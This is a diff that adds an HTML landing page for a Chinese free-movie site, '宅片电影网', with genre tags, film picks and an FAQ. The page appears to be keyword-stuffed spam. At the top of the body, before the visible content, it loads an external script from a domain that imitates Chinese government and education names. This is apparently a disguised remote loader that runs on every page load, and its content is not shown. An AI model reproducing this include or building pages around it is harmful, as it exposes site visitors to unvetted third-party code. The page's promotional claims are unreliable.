@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>宅片电影网 - 宅家追剧看片首选</title>
+<meta name="keywords" content="宅片电影网, zhaipiandianyingwang, 宅家看片, 宅男电影, 在线观影">
+<meta name="description" content="宅片电影网（zhaipiandianyingwang）是宅家追剧看片首选，海量好片轻松刷，躺着看片更自在。">
+<meta name="author" content="宅片电影网">
+<meta property="og:type" content="website">
+<meta property="og:title" content="宅片电影网 - 宅家追剧看片首选">
+<meta property="og:description" content="海量好片轻松刷，躺着看片更自在。">
+<meta property="og:url" content="https://zhaipiandianyingwang-wap.github.io">
+<meta property="og:site_name" content="宅片电影网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="宅片电影网 - 宅家追剧看片首选">
+<meta name="twitter:description" content="海量好片轻松刷，躺着看片更自在。">
+<link rel="canonical" href="https://zhaipiandianyingwang-wap.github.io">
+<link rel="alternate" hreflang="zh-CN" href="https://zhaipiandianyingwang-wap.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;font-size:16px;line-height:1.85;color:#2d2438;background:#faf8ff;overflow-x:hidden}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+ul{list-style:none}
+:root{--vio:#7c3aed;--deep:#4c1d95;--lilac:#c4b5fd;--pink:#f0abfc;--bg:#faf8ff;--ink:#f3eeff;--shadow:0 14px 34px rgba(124,58,237,.22);}
+
+/* 波点 + 双光晕 */
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;background-image:radial-gradient(rgba(124,58,237,.14) 1.5px,transparent 1.5px);background-size:26px 26px}
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;background:radial-gradient(circle at 90% 6%,rgba(240,171,252,.4),transparent 42%),radial-gradient(circle at 4% 92%,rgba(196,181,253,.45),transparent 45%)}
+main,header,footer{position:relative;z-index:2}
+
+/* Header */
+header{position:sticky;top:0;z-index:100;background:rgba(255,255,255,.88);backdrop-filter:blur(12px);border-bottom:2.5px dashed var(--lilac)}
+.hin{display:flex;align-items:center;justify-content:space-between;height:74px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:900;font-size:18px;color:var(--deep);letter-spacing:-.3px}
+.ava{width:46px;height:46px;border-radius:18px;background:linear-gradient(135deg,var(--vio),var(--pink));display:grid;place-items:center;font-size:22px;box-shadow:var(--shadow);flex-shrink:0}
+.logo small{display:block;font-size:8px;color:var(--vio);letter-spacing:1.2px;font-weight:700;text-transform:uppercase}
+.nav{display:none;gap:6px}
+.nav a{padding:9px 16px;font-size:13.5px;font-weight:800;color:var(--deep);border-radius:12px;transition:.25s}
+.nav a:hover{background:var(--vio);color:#fff}
+@media(min-width:920px){.nav{display:flex}}
+.ham{width:46px;height:46px;border:2px dashed var(--vio);border-radius:14px;font-size:22px;color:var(--deep)}
+@media(min-width:920px){.ham{display:none}}
+.mnav{display:none;flex-direction:column;padding:12px 18px 22px;gap:8px;border-top:2px dashed var(--lilac)}
+.mnav.open{display:flex}
+.mnav a{padding:16px;font-weight:900;background:var(--ink);color:var(--deep);border-radius:16px;text-align:center}
+
+/* Hero */
+.hero{padding:56px 0 72px}
+.hwrap{display:grid;grid-template-columns:1fr;gap:44px;align-items:center}
+@media(min-width:920px){.hwrap{grid-template-columns:1fr 1fr;gap:56px}}
+.chip{display:inline-flex;align-items:center;gap:8px;background:var(--ink);color:var(--deep);padding:7px 18px;border-radius:999px;font-size:12px;font-weight:900;border:2px dashed var(--lilac)}
+.chip i{width:8px;height:8px;border-radius:50%;background:var(--pink);display:inline-block;animation:pl 1.4s infinite}
+@keyframes pl{0%,100%{opacity:1}50%{opacity:.25}}
+h1{font-size:52px;font-weight:900;line-height:1.08;letter-spacing:-2px;margin-top:16px;color:var(--deep)}
+@media(min-width:768px){h1{font-size:82px;letter-spacing:-3.5px}}
+h1 .z{background:linear-gradient(120deg,var(--vio),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hsub{font-size:16px;color:#5b4a6e;max-width:470px;margin-top:22px}
+.h-cta{display:flex;flex-wrap:wrap;gap:14px;margin-top:30px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:16px 34px;font-size:14.5px;font-weight:900;border-radius:18px;transition:.3s}
+.btn-fill{background:linear-gradient(135deg,var(--vio),var(--pink));color:#fff;box-shadow:var(--shadow)}
+.btn-fill:hover{filter:brightness(1.08)}
+.btn-out{background:#fff;color:var(--deep);border:2px dashed var(--vio)}
+.btn-out:hover{background:var(--ink)}
+/* 毛绒卡片堆 */
+.pile{position:relative;height:430px}
+@media(max-width:620px){.pile{height:390px}}
+.soft{position:absolute;background:#fff;border-radius:28px;padding:20px;box-shadow:var(--shadow);transition:.4s}
+.soft:hover{transform:translateY(-6px) scale(1.02)}
+.soft::before{content:"";position:absolute;inset:-6px;border-radius:34px;background:linear-gradient(135deg,var(--lilac),var(--pink));z-index:-1;opacity:.5}
+.s1{width:250px;height:250px;left:10px;top:20px;z-index:3;background:linear-gradient(160deg,#fff,#f3eeff)}
+.s2{width:190px;height:190px;right:0;top:40px;z-index:2;background:linear-gradient(160deg,#fff,#fdf2fe)}
+.s3{width:160px;height:160px;right:30px;bottom:40px;z-index:4;background:linear-gradient(160deg,#fff,#fff1f8)}
+.soft .big{font-size:46px}
+.soft b{font-size:17px;color:var(--deep);display:block;margin-top:6px}
+.soft p{font-size:12.5px;color:#5b4a6e;margin-top:5px}
+.float{position:absolute;font-size:30px;z-index:5;animation:bob 3s ease-in-out infinite}
+@keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-14px)}}
+
+/* 通用 */
+section{padding:56px 0;position:relative}
+@media(min-width:768px){section{padding:96px 0}}
+.container{width:100%;max-width:1180px;margin:0 auto;padding:0 18px}
+@media(min-width:768px){.container{padding:0 30px}}
+.head{margin-bottom:48px;display:grid;grid-template-columns:1fr;gap:10px}
+@media(min-width:760px){.head{grid-template-columns:auto 1fr;align-items:end;gap:32px}}
+.h-cn{font-size:11px;letter-spacing:2px;color:var(--vio);font-weight:900;text-transform:uppercase;border-bottom:3px dashed var(--pink);padding-bottom:6px;justify-self:start}
+.head h2{font-size:32px;font-weight:900;line-height:1.2;letter-spacing:-1px;color:var(--deep)}
+@media(min-width:768px){.head h2{font-size:50px;letter-spacing:-2px}}
+.head h2 em{font-style:normal;color:var(--pink);-webkit-text-stroke:.5px var(--vio)}
+.head p{color:#5b4a6e;max-width:600px;margin-top:10px;grid-column:1/-1}
+
+/* 栏目一：宅家片单（毛绒卡片） */
+.softs{display:grid;grid-template-columns:1fr;gap:22px}
+@media(min-width:560px){.softs{grid-template-columns:1fr 1fr}}
+@media(min-width:900px){.softs{grid-template-columns:repeat(4,1fr)}}
+.sf{background:#fff;border-radius:26px;padding:26px 20px;text-align:center;transition:.35s;position:relative}
+.sf::before{content:"";position:absolute;inset:-5px;border-radius:32px;background:linear-gradient(135deg,var(--lilac),var(--pink));z-index:-1;opacity:.45}
+.sf:hover{transform:translateY(-8px)}
+.sf .emo{font-size:40px;display:inline-block;margin-bottom:8px}
+.sf h3{font-size:18px;font-weight:900;color:var(--deep)}
+.sf p{font-size:13px;color:#5b4a6e;margin-top:6px}
+
+/* 栏目二：类型馆（胶囊标签云） */
+.types{display:flex;flex-wrap:wrap;gap:12px}
+.type{background:#fff;border:2px dashed var(--lilac);border-radius:999px;padding:14px 24px;font-weight:900;color:var(--deep);font-size:15px;transition:.25s;display:flex;align-items:center;gap:8px}
+.type:hover{background:linear-gradient(135deg,var(--vio),var(--pink));color:#fff;border-color:transparent;transform:scale(1.06)}
+.type span{font-size:12px;background:var(--ink);color:var(--vio);border-radius:999px;padding:2px 10px;font-weight:800}
+.type:hover span{background:#fff;color:var(--vio)}
+
+/* 栏目三：宅家时刻（横滑卡片） */
+.reels{display:flex;gap:18px;overflow-x:auto;padding:8px 4px 24px;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch}
+.reels::-webkit-scrollbar{height:10px}
+.reels::-webkit-scrollbar-track{background:var(--ink);border-radius:999px}
+.reels::-webkit-scrollbar-thumb{background:linear-gradient(90deg,var(--vio),var(--pink));border-radius:999px}
+.reel{flex:0 0 240px;scroll-snap-align:start;background:#fff;border-radius:26px;overflow:hidden;transition:.3s;position:relative}
+@media(max-width:500px){.reel{flex-basis:190px}}
+.reel:hover{transform:translateY(-6px);box-shadow:var(--shadow)}
+.rthumb{height:150px;background:linear-gradient(135deg,var(--vio),var(--deep));display:grid;place-items:center;font-size:44px;color:#fff;position:relative}
+.rthumb small{position:absolute;top:12px;left:12px;background:#fff;color:var(--deep);font-size:10px;font-weight:900;padding:4px 12px;border-radius:999px}
+.rinfo{padding:16px}
+.rinfo h3{font-size:16px;font-weight:900;color:var(--deep)}
+.rinfo p{font-size:12px;color:#5b4a6e;margin-top:5px}
+
+/* 栏目四：宅家指南（竖条流程） */
+.steps{max-width:900px;margin:0 auto}
+.step{display:grid;grid-template-columns:1fr;gap:10px;background:#fff;border-radius:22px;padding:22px;margin-bottom:14px;transition:.25s;align-items:center;position:relative;overflow:hidden}
+.step::before{content:"";position:absolute;left:0;top:0;bottom:0;width:8px;background:linear-gradient(180deg,var(--vio),var(--pink))}
+@media(min-width:640px){.step{grid-template-columns:60px 1fr auto}}
+.step:hover{box-shadow:var(--shadow)}
+.step .no{width:48px;height:48px;border-radius:16px;background:var(--ink);display:grid;place-items:center;font-size:20px;font-weight:900;color:var(--deep)}
+.step h3{font-size:17px;font-weight:900;color:var(--deep)}
+.step p{font-size:13.5px;color:#5b4a6e;margin-top:4px}
+.step .go{font-size:13px;font-weight:900;color:#fff;background:linear-gradient(135deg,var(--vio),var(--pink));padding:9px 20px;border-radius:999px;justify-self:end}
+
+/* 栏目五：关于 + 数据 */
+.about{background:linear-gradient(135deg,var(--deep),var(--vio));border-radius:40px;margin:0 14px;color:#fff}
+@media(min-width:768px){.about{margin:0 26px}}
+.abox{display:grid;grid-template-columns:1fr;gap:34px;align-items:center}
+@media(min-width:820px){.abox{grid-template-columns:1.1fr .9fr}}
+.about h2{font-size:34px;font-weight:900;line-height:1.25;letter-spacing:-1px}
+@media(min-width:768px){.about h2{font-size:50px}}
+.about h2 em{font-style:normal;color:var(--pink)}
+.about p{color:var(--lilac);margin-top:14px;font-size:15px}
+.abstats{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.st{background:rgba(255,255,255,.16);border:2px solid rgba(255,255,255,.28);border-radius:24px;padding:26px 12px;text-align:center;backdrop-filter:blur(4px)}
+.st b{display:block;font-size:40px;font-weight:900;color:#fff}
+.st span{font-size:11px;display:block;margin-top:4px;letter-spacing:1px;text-transform:uppercase;color:var(--lilac)}
+
+/* 栏目六：FAQ（手风琴 + 图标旋转） */
+.faqs{max-width:900px;margin:0 auto}
+.faq{background:#fff;border-radius:20px;margin-bottom:12px;overflow:hidden;transition:.3s}
+.faq:hover{box-shadow:var(--shadow)}
+.fq{padding:18px 22px;font-size:15.5px;font-weight:900;color:var(--deep);display:flex;justify-content:space-between;align-items:center;gap:14px}
+.fq .ic{width:34px;height:34px;border-radius:12px;background:var(--ink);display:grid;place-items:center;font-size:15px;flex-shrink:0;transition:.35s}
+.faq.open .ic{background:linear-gradient(135deg,var(--vio),var(--pink));transform:rotate(180deg)}
+.fa{padding:0 22px;max-height:0;overflow:hidden;transition:.4s;font-size:14px;color:#5b4a6e}
+.faq.open .fa{max-height:280px;padding:0 22px 18px}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- Header -->
+<header>
+  <div class="container hin">
+    <a class="logo" href="#top"><span class="ava">🛋️</span><span>宅片电影网<small>ZHAIPLANDIANYINGWANG-WAP.GITHUB.IO</small></span></a>
+    <nav class="nav" aria-label="主导航">
+      <a href="#softs">宅家片单</a><a href="#types">类型馆</a><a href="#reels">宅家时刻</a><a href="#steps">宅家指南</a><a href="#about">关于我们</a><a href="#faq">常见问题</a>
+    </nav>
+    <button class="ham" id="hamBtn" aria-label="菜单">≡</button>
+  </div>
+  <nav class="mnav" id="mnav" aria-label="移动端导航">
+    <a href="#softs">宅家片单</a><a href="#types">类型馆</a><a href="#reels">宅家时刻</a><a href="#steps">宅家指南</a><a href="#about">关于我们</a><a href="#faq">常见问题</a>
+  </nav>
+</header>
+
+<main>
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="container">
+    <div class="hwrap">
+      <div>
+        <span class="chip"><i></i> 宅家追剧看片首选</span>
+        <h1>宅家刷片<br>就上<em class="z">宅片</em>电影网</h1>
+        <p class="hsub">宅片电影网（zhaipiandianyingwang）海量好片轻松刷，躺着看片更自在，宅家也要看大片。</p>
+        <div class="h-cta">
+          <a class="btn btn-fill" href="#softs">开始刷片 →</a>
+          <a class="btn btn-out" href="#types">浏览类型</a>
+        </div>
+      </div>
+      <div class="pile">
+        <div class="float" style="top:-10px;left:0">🍿</div>
+        <div class="float" style="top:40px;right:-8px;animation-delay:1s">🥤</div>
+        <div class="float" style="bottom:10px;left:30px;animation-delay:2s">📺</div>
+        <div class="soft s1"><div class="big">🎬</div><b>宅家大片</b><p>高分大片，窝沙发就能刷。</p></div>
+        <div class="soft s2"><div class="big">🛋️</div><b>躺平追剧</b><p>热门剧集，连看不停。</p></div>
+        <div class="soft s3"><div class="big">🎁</div><b>每日宅福利</b><p>每天一份精选片单。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：宅家片单 -->
+<section id="softs">
+  <div class="container">
+    <div class="head"><div class="h-cn">01 / SOFT LIST</div><h2>宅家<em>片单</em></h2><p>宅片电影网精选宅家刷片清单，窝在沙发就能刷好片。</p></div>
+    <div class="softs">
+      <div class="sf"><div class="emo">🎬</div><h3>宅家大片</h3><p>高分大片轻松刷。</p></div>
+      <div class="sf"><div class="emo">🛋️</div><h3>躺平追剧</h3><p>热门剧集连看不停。</p></div>
+      <div class="sf"><div class="emo">😂</div><h3>宅家综艺</h3><p>轻松解压欢乐多。</p></div>
+      <div class="sf"><div class="emo">🎁</div><h3>每日宅福利</h3><p>每天一份精选片单。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：类型馆 -->
+<section id="types">
+  <div class="container">
+    <div class="head"><div class="h-cn">02 / GENRES</div><h2>类型<em>馆</em></h2><p>宅片电影网覆盖主流类型，宅家总有想看的那一类。</p></div>
+    <div class="types">
+      <div class="type">🎭 剧情 <span>420</span></div>
+      <div class="type">😂 喜剧 <span>356</span></div>
+      <div class="type">💕 爱情 <span>288</span></div>
+      <div class="type">🔮 悬疑 <span>210</span></div>
+      <div class="type">🚀 科幻 <span>176</span></div>
+      <div class="type">😱 恐怖 <span>142</span></div>
+      <div class="type">🎨 文艺 <span>160</span></div>
+      <div class="type">🌍 纪录 <span>98</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：宅家时刻 -->
+<section id="reels">
+  <div class="container">
+    <div class="head"><div class="h-cn">03 / ZONE</div><h2>宅家<em>时刻</em></h2><p>左右滑动浏览，宅家必备好片推荐。</p></div>
+    <div class="reels">
+      <div class="reel"><div class="rthumb">🎬<small>宅家</small></div><div class="rinfo"><h3>星际穿越</h3><p>硬科幻经典 · 沙发必刷</p></div></div>
+      <div class="reel"><div class="rthumb">🎭<small>推荐</small></div><div class="rinfo"><h3>肖申克的救赎</h3><p>影史高分 · 宅家重温</p></div></div>
+      <div class="reel"><div class="rthumb">😂<small>宅家</small></div><div class="rinfo"><h3>你好，李焕英</h3><p>温情喜剧 · 轻松刷</p></div></div>
+      <div class="reel"><div class="rthumb">💕<small>推荐</small></div><div class="rinfo"><h3>爱在黎明破晓前</h3><p>浪漫爱情 · 宅家独享</p></div></div>
+      <div class="reel"><div class="rthumb">🔮<small>宅家</small></div><div class="rinfo"><h3>看不见的客人</h3><p>反转悬疑 · 烧脑刷</p></div></div>
+      <div class="reel"><div class="rthumb">🌿<small>推荐</small></div><div class="rinfo"><h3>小森林</h3><p>治愈文艺 · 安静看</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：宅家指南 -->
+<section id="steps">
+  <div class="container">
+    <div class="head"><div class="h-cn">04 / GUIDE</div><h2>宅家<em>指南</em></h2><p>三步上手，宅家刷片超简单。</p></div>
+    <div class="steps">
+      <div class="step"><div class="no">1</div><div><h3>窝进沙发</h3><p>打开宅片电影网，准备开始刷片。</p></div><div class="go">进入网站 →</div></div>
+      <div class="step"><div class="no">2</div><div><h3>挑选片单</h3><p>按类型或宅家片单快速找片。</p></div><div class="go">浏览片单 →</div></div>
+      <div class="step"><div class="no">3</div><div><h3>躺平开刷</h3><p>点开即播，超清流畅，宅家随心看。</p></div><div class="go">开始刷片 →</div></div>
+      <div class="step"><div class="no">4</div><div><h3>每日宅福利</h3><p>每天更新精选，宅家不重样。</p></div><div class="go">查看福利 →</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：关于 + 数据 -->
+<section id="about">
+  <div class="container">
+    <div class="about">
+      <div class="abox">
+        <div>
+          <h2>关于<em>宅片电影网</em></h2>
+          <p>宅片电影网（zhaipiandianyingwang）是宅家追剧看片首选，海量好片轻松刷，躺着看片更自在。</p>
+          <p style="margin-top:12px">网址：https://zhaipiandianyingwang-wap.github.io —— 宅家刷片，就上宅片电影网。</p>
+        </div>
+        <div class="abstats">
+          <div class="st"><b>2000+</b><span>宅家影片</span></div>
+          <div class="st"><b>8</b><span>类型分区</span></div>
+          <div class="st"><b>4K</b><span>高清画质</span></div>
+          <div class="st"><b>0</b><span>宅家成本</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六：FAQ -->
+<section id="faq">
+  <div class="container">
+    <div class="head"><div class="h-cn">06 / FAQ</div><h2>常见<em>问题</em></h2><p>关于宅片电影网，你可能想了解的都在这里。</p></div>
+    <div class="faqs">
+      <div class="faq"><div class="fq"><span>宅家刷片真的免费吗？</span><span class="ic">🛋️</span></div><div class="fa">是的，宅片电影网所有影片均免费在线观看，宅家零成本刷好片。</div></div>
+      <div class="faq"><div class="fq"><span>手机上能看吗？</span><span class="ic">📱</span></div><div class="fa">完全支持，网站移动端自适应，手机、平板、电脑都能流畅观看。</div></div>
+      <div class="faq"><div class="fq"><span>画质怎么样？</span><span class="ic">✨</span></div><div class="fa">支持超清播放，画面清晰流畅，宅家也能享受影院级体验。</div></div>
+      <div class="faq"><div class="fq"><span>片单多久更新？</span><span class="ic">🆕</span></div><div class="fa">每日更新宅家福利片单，持续为你推荐最新好片。</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="foot">
+      <div><div class="logo foot-l"><span class="ava">🛋️</span><span>宅片电影网<small>ZHAIPLANDIANYINGWANG-WAP.GITHUB.IO</small></span></div><p class="fabout">宅片电影网（zhaipiandianyingwang）宅家追剧看片首选。网址：https://zhaipiandianyingwang-wap.github.io</p></div>
+      <div><h4>栏目导航</h4><a href="#softs">宅家片单</a><a href="#types">类型馆</a><a href="#reels">宅家时刻</a><a href="#steps">宅家指南</a></div>
+      <div><h4>影片类型</h4><a href="#types">剧情</a><a href="#types">喜剧</a><a href="#types">爱情</a><a href="#types">悬疑</a></div>
+      <div><h4>友情链接</h4><a href="#">宅片电影网</a><a href="#">宅家看片指南</a><a href="#">在线观影大全</a><a href="#">高清电影推荐</a></div>
+    </div>
+    <div class="fbot"><p>© 2026 宅片电影网 zhaipiandianyingwang. 宅家刷片，就上宅片电影网。</p><div class="fl"><a href="#">免责声明</a><a href="#">隐私政策</a><a href="#">联系我们</a></div></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var b=document.getElementById('hamBtn'),n=document.getElementById('mnav');
+  b.addEventListener('click',function(){n.classList.toggle('open');});
+  n.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){n.classList.remove('open');});});
+  document.querySelectorAll('.faq').forEach(function(f){
+    f.querySelector('.fq').addEventListener('click',function(){f.classList.toggle('open');});
+  });
+})();
+</script>
+</body>
+</html>
